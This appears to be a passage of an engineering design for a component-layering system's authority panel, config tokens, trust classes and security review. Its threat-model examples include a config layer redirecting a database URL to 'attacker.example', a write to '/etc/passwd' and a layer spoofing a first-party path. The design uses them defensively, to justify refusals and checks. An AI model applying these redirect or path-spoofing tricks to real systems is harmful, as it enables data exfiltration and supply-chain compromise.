**Crossing tokens are re-keyed by row label before diffing.** `crossings`
(`audit_diff.py:234`) keys `emit:` and `host:` by COMPONENT NAME. Under
decision 1 a component rename is a non-event, but a component-keyed token set
would read a rename as a full turnover: every token removed, every token added.
So the panel maps component to row label through the row table, for base and
candidate both, and diffs `emit:@db:metrics.record`, `host:@db:pg_connect`.
This is a small change and it is required by decision 1; without it the panel
contradicts the identity model, and rename transparency (which B claimed for
the wiring diff) would not hold for the authority diff.

### 8.3 Fix, part one: the composition declares the reach bound

`reach` is currently declared per extern, in the component's source, by the
component's author. That is the wrong owner for a layered world: the person
deciding what `pg_connect` may talk to is the operator assembling the
composition, not the third party who wrote the extern. So a row may carry a
composition-level reach bound (the `reach { ... }` clause in §6.1).

**The rule: a config value that flows to a bounded extern is checked against the
composition's declared bound at resolution time.** A `configure` that moves
`url` to `attacker.example` is a refusal, not a silent redirect:

```text
refused: layer acme::pg@2.1 configures @db.url to a value outside the reach
  declared for `pg_connect` in composition `Harness`
    declared:  host("primary.internal:5432")
    requested: host("attacker.example:5432")
  Widen the bound in your site layer, or refuse the layer.
```

This is the composition-first framing earning its keep: the authority bound
belongs on the object the human approves.

**Implementation note the merge forces.** `_reach_map` (`audit_diff.py:250`)
maps extern NAME to reach, flat, because "the reach is a property of the EXTERN,
not of a per-component crossing". A composition-level bound is per ROW, so two
rows reaching the same extern name with different declared bounds cannot be
represented in that map. The panel's reach comparison must therefore be keyed
`(row, extern)`, which is the same re-keying §8.2 already requires. `diff_reach`
composes unchanged otherwise: widening a composition-level bound in the site
layer moves a declared bound and is already flagged `reach-weakened:`.

### 8.4 Fix, part two: a sixth crossing token, with a value digest

Not every extern has a declared reach. So add a sixth crossing kind:

```text
config:<row-label>:<field>:<digest8>
```

emitted for a config field whose value reaches an emission argument or an
extern argument. The classifier is the reach and taint machinery that already
exists (`_reach_map`, and G9 provenance at `lower.py:5364`); a field that only
feeds pure computation (`max_steps: 8`) gets no token. A redirect then renders
as a first-class widening:

```text
~ config:@db:url:1f4a9c2e   "postgres://primary:5432/app"
                         -> "postgres://attacker.example/app"
      reaches host:@db:pg_connect
```

**Two departures from B's spelling, both required by decisions taken here.**

*Keyed by row label, not by component.* B proposed
`config:<component>:<field>`. Under decision 1 the component name is not
identity, so a component rename would rename the token, which is the exact
failure decision 1 exists to prevent. Same reasoning as §8.2.

*The token carries a digest of the value.* B's token is
`config:<component>:<field>`, and `audit_diff.evaluate` (`:528`) acknowledges by
token string, with `--accept <token>` copy-pasted into a CI ack list. A
value-free config token means `--accept config:@db:url` in a checked-in ack file
accepts EVERY future value of that field, including the attacker's, forever.
That is a second-order form of the same critical, reintroduced by the fix. An
8-hex digest of the canonicalized value pins the ack to the value that was
reviewed: a later change to the same field produces a different token and
re-prompts. The digest, not the value, goes in the token, so a config value that
is itself sensitive is never carried into an ack file, a CI log or a commit
message; the panel prints the values, which is where a human reads them.

### 8.5 Fix, part three: the fail-closed headline

**The panel never prints `clean` unless every one of these holds:**

1. the re-keyed crossing token set is unchanged, across all six kinds;
2. the resolved composition's config surface is byte-identical to the base's,
   for every row;
3. every non-first-party row was admitted under the untrusted-author profile
   (no `--trust-host-code` in play);
4. `diff_reach`, `diff_capability_scopes`, `diff_backends`, `diff_recovery`,
   `diff_cardinality` and `diff_registers` are all empty of widenings;
5. no config field was unclassifiable.

Conjunct 5 is the load-bearing one and it states the direction: **a field whose
dataflow the classifier cannot decide is treated as authority-bearing**, so it
emits a `config:` token and conjunct 1 fails. Reach analysis is incomplete by
nature; incompleteness then costs noise, never silence, which is the only
acceptable direction for a surface whose green line a human will trust.

Conjunct 3 is A's half, wired into B's headline: a `--trust-host-code` row means
the panel is not entitled to the word `clean` at all, however quiet the tokens
are.

### 8.6 Fix, part four: who may configure what

> A **stack layer** may `configure` only a row it also `add`s or `replace`s, or
> a field the base composition declared `open`. The **site layer** and the
> invocation overlay may configure anything.

An unrestricted `configure` on a row a layer does not own is an authority with
no declared reach, which is the shape 424(b) refuses for interception. This
preserves the motivating use case exactly: "a user overrides one row and
restarts, nobody forks" is the SITE layer, and it stays unrestricted, which is
right, because the operator is not attacking themselves. What becomes
restricted is a third party reaching into a row it does not own, which is the
case that motivated the review.

The cost is real and correct: `open` is a new obligation on composition
authors, and a base that declares nothing `open` is not extensible by
configuration, only by `replace`. An extension point nobody declared is not an
extension point, it is an accident, and "third parties can reach any field of
any row" is how a configuration surface becomes an unversioned API that can
never be changed. Making the surface explicit is the same move `service` makes
for method surfaces and `provides` makes for wiring.

### 8.7 The panel prints its own blind spots

A's requirement, and it is not decoration. The BLIND SPOTS block is printed
ALWAYS, including on a clean verdict, because a screen that looks complete
while being structurally blind to the likeliest attack is worse than no screen.

```text
TRUST BASIS  MEASURED, first-party bodies trusted by premise
             3 non-first-party rows, all admitted no-extern (item 329)

AUTHORITY    applying acme::pg@2.1 to Harness (generation 7), 3 widenings
  + host:@db:pg_connect              new host reach          capability: net
  + emit:@db:metrics.record          new emission
  ~ config:@db:url:1f4a9c2e          value reaches host:@db:pg_connect
  - host:@db:sqlite_open             removed (narrowing, never blocks)
  = fs, registry, gate               unchanged

  net: NEW. This composition did not reach the network before.

CONFIG
  @db  url   "postgres://primary:5432/app" -> "postgres://replica:5432/app"
                                                          acme::pg@2.1  BOUNDED, in bound
  @db  pool  8 -> 16                                      acme::pg@2.1  pure, no token

WIRING
  row @db      PgDatabase replaces SqliteDatabase          acme::pg@2.1
  row @metrics MetricsSink added                           acme::pg@2.1
  `Front` now requires `metrics`

ROWS
  @db      replaced   acme::pg@2.1
  @metrics added      acme::pg@2.1
  @cache   unchanged

PROVENANCE
  acme_pg   VERIFIED (recomputed here)
              sourceHash    b782e70c...  matches the pin in truc.lock
              admission     PASSES this machine's gate (untrusted-author)
            CLAIMED (written by the publisher, not checked)
              publisher     "acme-observability"
              fault sweep   "9999/9999"
              attestation   present, unverified (no key configured)

BLIND SPOTS  what this panel does NOT measure
  * Token granularity. `fs` was already held. A crossing that widens which
    PATHS it reaches produces no new token. 3 rows reach `fs`; @db is new
    among them. Parameterized spellings are item 294.
  * First-party host bodies. @gate, @routes and @agent carry externs this
    panel reads by declaration, not by inspection. A config change can steer
    them; see CONFIG.
  * Unbounded externs. `host_env_read` has no declared reach, so no config
    value flowing to it can be checked against a bound. Declare one in
    composition Harness to close this.
  * 0 unclassifiable config fields this run. Any would count as
    authority-bearing and appear above as `config:` tokens.

VERDICT      admissible (gate 1.0.0, language 2.0.0), 3 widenings unacknowledged
             Acknowledge with --accept <token> or --accept-all.
```

Where each line comes from: `audit_diff.crossings` per row, re-keyed and folded;
`audit_diff.diff_crossings` for the delta; the capability label from the
per-component boundary table; `composition_diff.diff` for the WIRING block,
which already speaks in guarantees ("provider of key `db` changed from
PgDatabase to MysqlDatabase") and is the single most important line in a
supply-chain substitution; the ROWS block from the fold's provenance record;
the CONFIG block from the resolver.

The PROVENANCE block's two-column split is mandatory and it exists because 428
F5 records that `Registry.from_dir` reads authority claims off `index.json`,
returns `component.rvl` from disk, and cross-checks neither. Anything in the
CLAIMED column is decoration and is labelled as such. A fabricated dossier can
only add lines to the lower half.

### 8.8 `--trust-host-code` changes the panel's shape

Not "these crossings were added", which implies a measurement, but:

```text
TRUST BASIS  CLAIMED. 1 row admitted with --trust-host-code.
             This panel cannot say what that row does.

UNCHECKED HOST CODE  otel_kit::@logger, 2 bodies, 41 lines of @py
  Nothing verifies these bodies against their declarations. The crossings
  below are what the row CLAIMS. Read them.
    claims: host:@logger:host_http_post   net
    claims: host:@logger:host_env_read    (undeclared capability)
  Printed in full below.
```

Default closed, the claim-versus-check distinction in the sentence rather than
a footnote, and the bodies printed so that "reviewed" is achievable rather than
notional.

### 8.9 Approval is only offered on a candidate that already admits

B's rule, kept. A refused layer is not an approval question, it is a refusal,
and it is shown with the linker's own why-trace and layer provenance (§3.4).
The operator's decision is never "will this work", it is only "do I consent to
this authority". That is the difference the item is about: DSH's layer applies
and then you find out.

Refusals are data, and nothing is written:

```text
refused: the patched composition would not admit.
  G2 provision conflict: key `db` is claimed by both
    acme_pg::@db      (stack layer acme::pg@2.1)
    corp_sqlite::@db  (stack layer corp::sqlite@0.4)
  The running composition is untouched.
```

`--apply` requires either an interactive confirmation or, in CI, an ack per
added crossing using `audit --diff`'s exact `--accept <token>` tokens, so the
ack list is copy-pasteable from the failure output and reviewable in a diff.
`--accept-all` exists and is a policy choice spelled in the repo.

---

## 9. Adversarial review

### 9.1 CRITICAL A, carried: the panel is computed from the attacker's own declarations

Stated in §8.1. Fix: decision 6 (§4), non-first-party rows compile under the
item-329 untrusted-author profile, always, so there is no host code in a fetched
row for a declaration to lie about; plus the default-closed
`--trust-host-code` escape hatch with a differently shaped panel (§8.8); plus
conjunct 3 of the fail-closed headline (§8.5), so a trusted-host-code row
forfeits the word `clean`.

**Residual after the fix, named and small.** A non-first-party row can still
call an extern the project already declared, with a different argument:
`host_write("/etc/passwd")` where the project only ever wrote `/tmp`. The panel
shows the new reacher (BLIND SPOTS, first bullet) but cannot show the path.
Closing that is item 294's parameterized capabilities. What the fix does buy is
that the reachable surface is bounded by the project's own declared externs and
the panel names which new rows reach each one.

### 9.2 CRITICAL B, carried: the panel is blind to config

Stated in §8.1. Fix: §8.3 (composition-declared reach bound, checked at
resolution), §8.4 (the sixth `config:` token, keyed by row label, carrying a
value digest), §8.5 (fail-closed headline, unclassifiable equals
authority-bearing), §8.6 (a stack layer may configure only rows it owns or
fields declared `open`).

**Residual.** Config reach classification is a dataflow analysis and dataflow
analyses are incomplete. Conjunct 5 makes incompleteness cost noise rather than
silence. A first-party body that reads a config value through a path the
classifier does not model still steers an extern and still emits no token, and
the BLIND SPOTS block says so in its second bullet.

### 9.3 NEW CRITICAL, introduced by the merge: "non-first-party" is not a checked fact, and the mechanism that would enforce it is whole-compile

The merge takes decision 6 (per-row confinement) from A and decisions 2, 4 and 8
(claim addressing, refusal-on-conflict, revl-declared compositions) from B.
Neither source design has to answer the question the combination raises, and I
did not see it until the two halves were written next to each other. It has two
faces and they are the same defect.

**Face one: the trust class is read off a path the attacker chooses.**

In design A, "non-first-party" is well defined: the row's truc prefix is not
`.`, and the prefix comes from `truc.toml` and the lock, which the operator
owns. In design B there is no notion of trust class at all. In the merged
design, a row is declared by a document and points at a file with `from
"path"`, and the path is a COMPOSITION fact under decision 8. If the confinement
decision reads the path, a stack layer writes

```text
layer evil::kit for Harness {
  add row @helper from "src/internal_admin.rvl" provides helper
}
```

and picks its own trust level, because the path looks first-party. Or, more
simply, it vendors its payload and names it with a path that resolves inside
the project tree. Either way decision 6 evaporates, and with it §8's entire
answer to CRITICAL A. The panel goes back to printing zero additions for a body
that declares itself pure.

**Face two: the profile is whole-compile, and decision 3 says there is one
compile.**

`compile_files(paths, manifest=, replacing=, profile=)` (`compiler.py:381`)
takes exactly ONE profile for the whole call, and it applies it to the merged
program: `_enforce_source([m.program for m in root_modules], profile)`
(`:559`), `check_no_host_extern_reach(..., profile)` (`:567-571`), and
`_lower(merged, ambient, taint_strict=bool(profile and profile.taint_strict),
untrusted=bool(profile and profile.untrusted))` (`:573`).

Decision 3 says the delta is admitted in ONE call. Decision 6 says
non-first-party rows are profiled and first-party rows are not. A delta
containing both cannot be expressed. The two ways out are both wrong:

- **Two calls.** The first-party rows admit against the running manifest, then
  the non-first-party rows admit against the result. That is per-group
  admission, and it reintroduces exactly the intermediate-state nondeterminism
  decision 3 exists to kill: a `remove` in one group and an `add` in the other
  succeeds or fails on G2 depending on which group went first.
- **One profile for both.** `no_extern` over the whole composition refuses the
  project's own legitimate externs, so the composition never admits at all. The
  pressure is therefore entirely toward dropping the profile, which is a silent
  security downgrade and is the direction an implementer under schedule
  pressure takes, because it is the one that makes the tests pass. The
  `fix/mcp-host-body-trust-and-path-jail` branch is direct evidence that the
  profile is applied per COMPILE CALL and not per row: its whole design is a
  per-call-site decision about which verb compiles agent-authored source.

The merge therefore states decision 6 in a form the shipped machinery cannot
execute, and the failure mode is not a crash, it is a quiet reversion to the
unprofiled compile that CRITICAL A describes.

**The fix, in three parts.**

**Part 1: the trust class is a property of the declaring document, not of the
path.** This is §4.1, and it is written there rather than here because it
belongs in the model. A row's trust class is the trust class of the document
that declared it; the base composition and the site layer are first-party;
every stack layer is non-first-party and so is every row it introduces,
whatever its `from` clause names; a stack layer's `from` path must resolve
inside its own truc's vendored directory or the layer is refused. Trust class
is a distribution fact read from the lock, which is decision 7 applied.

**Part 2: split the profile into per-root structural checks and whole-compile
analysis flags.** The split is already latent in `admit_profile.py` and the
code shows exactly where the seam is.

- `check_no_extern` is ALREADY per root module: the loader calls it at
  `compiler.py:212-214` for each root under a `no_extern` profile, on the
  parsed AST, before any body is lowered. This half needs only to take a
  per-root profile instead of one.
- `check_no_host_extern_reach` (`admit_profile.py:213`) is a structural bare-name
  sweep over each root's bodies against the transitive host-extern set. Also
  per-root, and also needs a per-root `granted` set.
- `granted` is inherently per-row: the set of services a non-first-party row may
  reach is a property of that row, and under decision 8 the composition
  declares it. This is the same clause as `open` and `reach`, and it belongs on
  the row.

So `compile_files` grows `profiles: dict[str, AdmissionProfile]` keyed by root
path, defaulting to today's single-profile behaviour when a bare `profile=` is
passed. The link runs ONCE, unprofiled, over the merged program, exactly as
decision 3 requires. Refusals name the row.

**Part 3: the two genuinely whole-compile flags take the JOIN, and the join is
in the safe direction.** `taint_strict` and `no_declassify` change the analysis
for the merged program and cannot be per-row. Take the strictest value any row
in the delta requires:

- `taint_strict` derives taint sinks and sources with no annotation
  (`admit_profile.py:124-128`). Turning it on for first-party code adds taint
  edges, so it can only over-refuse, which is the same direction decision 3's
  soundness argument relies on. A composition containing any non-first-party
  row compiles taint-strict throughout, and that is a defensible default
  independently.
- `no_declassify` forbids the ROOT source from minting its own declassifiers.
  Joining it would refuse a first-party `endorse`, which is a legitimate
  first-party act, so this one must stay per-root and is part of Part 2's
  structural split, not of the join. `check_no_declassify` is an AST sweep like
  `check_no_extern`, so the seam holds.
- `untrusted` (`admit_profile.py:147`) is only a refusal-redaction trigger for
  navigable refusals (`navigate.py:59`). Do not join it: key it per refusal site
  by the row whose source raised the diagnostic, or first-party diagnostics get
  redacted for no reason.

**Exit test for this critical.** A delta containing one first-party row that
declares an extern and one non-first-party row that declares an extern is
admitted in ONE `compile_files` call: the first-party extern admits, the
non-first-party one is refused, the refusal names the row and the layer, and the
resulting manifest is byte-identical to what a full re-admission produces.

### 9.4 Secondary findings, all closed above

**The ack token is coarser than the fact it acknowledges.** A value-free
`config:` token means an ack in a checked-in CI file accepts every future value
of that field. Closed by the value digest in §8.4. Worth flagging as a general
pattern: every token this design adds to the `--accept` vocabulary must be as
fine-grained as the fact a human reviewed, or the ack file becomes a standing
grant, which is the same defect roadmap 427 F3 records for
`mint_standing_grant`.

**A component rename would read as a full authority turnover.** Closed by the
row-label re-keying in §8.2, which decision 1 requires anyway.

**A layer document could be a component-authoring surface.** Closed by the
grammar rule in §6.1: a layer contains only layer operations.

**Determinism under per-operation admission.** Closed by decision 3 (§3.3).

**Ergonomics of whole-component replacement.** A model whose only operation is
"replace a whole component" is too coarse for the change people actually make,
which is one number, and a model nobody uses fails the item's objective. Closed
by `configure` desugaring to a synthesized config provider (§3.2), which keeps
the one-line ergonomics and gains type checking DSH cannot offer.

**Two layers minting the same label.** Closed by origin scoping (§1.2).

---

## 10. Dependencies

Fix-branch status checked against `origin/main` at `ff1102e8`. None of the
three fix branches has landed; each is one commit ahead of main.

### From roadmap 428

| finding | status here | fix branch |
|---|---|---|
| **F3, the optional pin** | **BLOCKING** | `fix/truc-lock-and-registry-trust` @ `f2a38301`, NOT on main |
| **F5, registry claims read as facts** | WANTED | same branch, fixed there |
| **F6, `truc reproduce` compares the registry against itself** | NOTED, and it is why F3 is blocking rather than wanted | same branch, attestation tier revived |
| **F2, the `G1..G9` claim is a constant** | WANTED, convergent with I3 | `fix/attestation-truthfulness` @ `a358278c`, NOT on main |
| **F1 (`sign_alg` unverified), F9 (no domain separation)** | NOT on the path | `fix/attestation-truthfulness`, irrelevant here |

**F3 is the one blocking prerequisite.** `truc/components/planner.rvl:163-164`
`plan_drift` skips any vendored truc with no lock row or a blank `sourceHash`,
and nothing requires a truc named in `truc.toml` to carry a pin. Executed
through the real CLI: with the row removed, `PgDatabase` became `ExfilDatabase`
reaching an unscoped emission while truc printed that every component was
admitted through the gate. Decision 7 puts the whole weight of row integrity on
the pin, so a skippable pin is not a degraded mode, it is the absence of the
mechanism. Required: a truc without a pin is a refusal at resolution, and truc's
own bootstrap lock (currently a bare file list with no hashes) carries them. The
branch does exactly this: "A missing row and a blank hash are now refusals with
their own message, exactly like drift."

**F5 is wanted, not blocking**, because §3.3 keeps the ranker out of the fold.
It is on the PROVENANCE panel's path: `Registry.from_dir` must recompute
`sourceHash` and `manifestHash` from the entry's bytes with the local compiler,
or the VERIFIED column prints publisher-written numbers in the column that says
the receiver checked them. Until it lands, PROVENANCE puts everything
registry-sourced in CLAIMED. The branch does recompute: "Every row is
cross-checked against the entry's own `component.rvl` by recompiling it."

**F2 is wanted and this design deliberately does not depend on it.** A layer is
re-admitted locally, always, and an attestation is never accepted in place of a
local admit. Attestation becomes load-bearing only for a future "skip the local
admit because someone else did it" optimization, which must wait for the claim
to be a measurement and for the checker identity to be bound into the signed
body. The second half is what I3 (§5.1) needs for cached per-row facts.

**F1 and F9 are not on the critical path.** This design signs nothing. Layers
are hashed and re-admitted. Said explicitly rather than inheriting a signature
story it does not use.

### From roadmap 425

**F1 is BLOCKING for decision 6.** The untrusted-author profile exists (item
329) and the question of who is a trusted host-code author is decided on
`fix/mcp-host-body-trust-and-path-jail` @ `a5c783e7`, NOT on main. That branch
wires the profile at the MCP verbs, which is a DIFFERENT call site from truc's
fetch and layer path, so this design needs a NEW wiring, not merely that branch
landing. What it does inherit from the branch, and should follow rather than
reinvent:

- the `--author-trust untrusted` default-closed control shape, which is the
  same shape as `--trust-host-code` in §4.2;
- the `--provider MODULE.rvl` map of operator-written host code the untrusted
  author may compose the services of, which is `Gate.propose`'s
  granted-providers map and is the natural home for §9.3 Part 2's per-row
  `granted` set;
- the precedent that the structural half of the profile runs once before
  dispatch, so every path that compiles through its own module is covered.

The branch is also the direct evidence for §9.3 face two: its entire design is
a per-call-site decision about which compile gets a profile, which is why a
per-row decision cannot be expressed with today's signature.

### From roadmap 421, found while merging and not named in the brief

**421 F1 is a dependency of the authority panel and was missed by both source
notes.** `lower.py:9487` `_cap_keyed` discards the declared capability token and
keys the `Cap` by the component's own local `requires` key spelling. The audit
records the finding's strongest form as "the emitted python performs the `/etc`
crossing while the G8 audit surface attests `attenuated: ["notes"]`". The G8
audit surface is exactly what `audit_report` and `crossings` read
(`audit_diff.py:41`, `_boundary(ir)`), so the panel's capability annotation
(`capability: net` in §8.7) is unsound wherever a spawn-attenuated grant is in
play. Fix is on `fix/f1-capability-token-attenuation` @ `4e81886`, NOT on main.
Classification: WANTED, not blocking, because it bites only through spawn
attenuation and the panel's crossing tokens themselves are unaffected; but
until it lands the panel must not print a capability label on a crossing
reached through a spawn handle, or it should print it as CLAIMED.

---

## 11. Slice split

**S1. The row table, buildable first, depends on nothing.** The composition
document (§6.1) minus `open` and `reach`; label declaration and origin scoping
(§1.2); the claim assertion checked against the header (§1.3); header-only
resolution (`_component_header_stub`); the base row table emitted into the IR
and into the manifest. No layers, no patches, no truc. This is buildable today
against `origin/main` and it unblocks everything else. It also pays for itself
immediately, independently of 426: it turns the harness's two measured
composition bugs (a 31-component composition missing a transitively used row, a
panel printing nine names while thirty-one keys were served) into compile
errors, and it shrinks the bootstrap from "compile, emit, exec, call, parse" to
"compile, read the manifest".

**S2. The fold, buildable after S1, depends on nothing new.** The four
operations (§3.2), the four levels (§3.1), the pure fold (§3.3), peer refusal
with layer provenance (§3.4), address resolution with the two spellings (§2.3)
and refusal-never-no-op (§2.4), `revl layer check` over headers only. Still no
truc, still no distribution: layers are files in a directory. This is where the
determinism properties are testable and it unblocks S3 and S4.

**S3. Incremental admission, buildable after S2, depends on nothing new.**
`admit_into` over the resolved delta (§5.1), the `replacing` withdrawal set, the
class partition and invariants I1 through I3, `--full`. Activation stays
whole-generation (§5.2). Evidence already exists in
`tests/test_manifest.py:44`.

**S4. The confinement split, and it genuinely waits.** Decision 6 (§4) plus the
§9.3 Part 2 per-root profile split in `compile_files`. This waits on **425 F1**,
not for the branch to land but for the decision it encodes to be settled and
for a second call site to be wired. It is the largest compiler-side change in
the design, it is where §9.3's critical is actually closed, and everything in §8
that answers CRITICAL A is downstream of it.

**S5. The authority panel, and it waits on S4 and on 428 F3.** Re-keying by row
label (§8.2), the `config:` token with its digest (§8.4), the fail-closed
headline (§8.5), `open` and the configure restriction (§8.6), the BLIND SPOTS
block (§8.7), the `--trust-host-code` shape change (§8.8). The panel is not
worth shipping before S4, because without S4 its headline is CRITICAL A's green
screen. The PROVENANCE block's VERIFIED column additionally waits on 428 F5;
until then everything registry-sourced prints under CLAIMED, which is correct
and shippable.

**S6. Distribution, and it waits on 428 F3 alone.** A layer is a truc, the
`[trucs]` origin namespace becomes real, the pin is mandatory, `truc apply` and
`truc stack check` exist. Nothing in S1 through S3 needs this, which is decision
7 working as intended: the composition is source of truth and truc is what it
gains when it wants third-party rows.

**Explicitly not in 426, and filed:** incremental activation of `replace` and
`remove` (G7, §5.2); the `configure`-only activation narrowing (§5.3);
parameterized capabilities closing the "same token, new reacher" residual (item
294); re-realming another author's component from a layer (§2.3); interception
(424(b), deliberately separate: a layer changes what is composed, never what
observes a call).

---

## 12. Exit tests

1. **Label identity survives a surface addition.** Upstream adds a provision to
   a pinned component. Every layer addressing that row still resolves, the row
   keeps its label, the addition appears in WIRING, and the run is admitted
   unless G2 refuses the new key.
2. **Label identity survives a rename.** Renaming a component in a source file,
   with no other change, produces an empty wiring diff, an empty authority diff,
   and no `replacing` argument.
3. **A removed provision is a refusal**, naming the row, the lost key, the layer
   that depended on it, and the pinned version that dropped it.
4. **Two origins may declare the same bare label**, and two labels with the same
   spelling in one origin is refused at parse time.
5. **An address that resolves to nothing is a refusal**, never a no-op, naming
   the address, the layer, and what the target provides instead.
6. **Peer conflicts refuse.** Two stack layers replacing the same row is a
   refusal with both layers named, and permuting the layer list changes nothing
   but message ordering.
7. **Site resolution works.** The same pair resolves when the site layer names
   both sides, and the resolved provider is the one named.
8. **The fold never calls the gate.** A deliberately corrupted resolver output
   cannot produce an admitted composition that `_link` would refuse, and
   `remove`-then-`add` and `add`-then-`remove` produce the same verdict.
9. **`configure` is typed.** A wrong-typed value does not admit and the refusal
   names the field and the declared return type; `configure` against a non-config
   row is refused before synthesis.
10. **Incremental admission.** Applying a `replace` layer compiles only the
    replacing rows, and the verdict and manifest are identical to a full
    re-compile. Assert both the verdict and the compiled-component count, the way
    `tests/test_manifest.py:44` already does.
11. **Additive layers stay hot.** An `add`-only layer applies through
    `_wire_turn` with no generation change.
12. **Header-only checking.** `revl layer check` resolves every row id and
    renders the full wiring diff without lowering any component body.
13. **CRITICAL A is closed.** A layer whose declared-`pure` `@py` body would
    exfiltrate is refused by the untrusted-author profile, so 425 F1's exploit
    shape has no reachable spelling on the layer path. A layer shipping any host
    body is refused by default, naming the bodies; `--trust-host-code` admits it,
    changes the panel's shape, and forfeits `clean`.
14. **CRITICAL B is closed.** A layer whose only operation is `configure @db {
    url: ... }` is refused when the field flows to a bounded extern; on an
    unbounded one it produces a `config:@db:url:<digest>` widening token; and in
    neither case does the panel print `clean`. Changing the value again produces
    a DIFFERENT token, so a prior `--accept` does not cover it.
15. **The new critical is closed.** A delta containing one first-party row
    declaring an extern and one non-first-party row declaring an extern is
    admitted in ONE `compile_files` call: the first admits, the second is refused
    with the row and layer named, and the manifest is byte-identical to a full
    re-admission. A stack layer whose `from` path resolves outside its own truc's
    vendored directory is refused.
16. **The panel is fail-closed.** An unclassifiable config field produces a
    `config:` token and prevents `clean`. A `--trust-host-code` row prevents
    `clean` with an unchanged token set.
17. **The pin is mandatory.** A vendored truc with no lock pin, or a blank
    `sourceHash`, is refused at resolution (the 428 F3 gate).
18. **Resolution is reproducible.** Byte-identical row table across two machines
    given the same composition, lock, layers and site layer, with different
    registry index contents present on each.
